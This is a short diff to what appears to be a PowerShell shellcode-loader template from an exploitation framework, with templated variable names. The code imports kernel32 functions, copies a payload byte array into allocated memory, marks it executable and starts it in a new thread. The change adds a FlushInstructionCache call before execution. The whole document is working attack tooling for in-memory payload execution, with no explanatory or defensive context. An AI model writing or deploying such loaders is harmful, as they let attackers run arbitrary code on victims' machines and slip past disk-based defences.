@@ -9,6 +9,7 @@ $%{var_syscode} = @"
 			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
 			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 			[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect,out int lpflOldProtect);
+			[DllImport("kernel32.dll")] public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
 			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
 		}
@@ -29,6 +30,7 @@ if ([Bool]!$%{var_baseaddr}) { $global:result = 3; return }
 [System.Runtime.InteropServices.Marshal]::Copy($%{var_code}, 0, $%{var_baseaddr}, $%{var_code}.Length)
 
 if ([%{var_kernel32}.func]::VirtualProtect($%{var_baseaddr},[Uint32]$%{var_code}.Length + 1, [%{var_kernel32}.func+MemoryProtection]::Execute, [Ref]$%{var_opf}) -eq $true ) {
+	[%{var_kernel32}.func]::FlushInstructionCache([IntPtr](-1), $%{var_baseaddr}, [UIntPtr]($%{var_code}.Length + 1)) | Out-Null
 	[IntPtr] $%{var_threadHandle} = [%{var_kernel32}.func]::CreateThread(0,0,$%{var_baseaddr},0,0,0)
 	if ([Bool]!$%{var_threadHandle}) { $global:result = 7; return }
 	$%{var_temp} = [%{var_kernel32}.func]::WaitForSingleObject($%{var_threadHandle}, [%{var_kernel32}.func+Time]::Infinite)
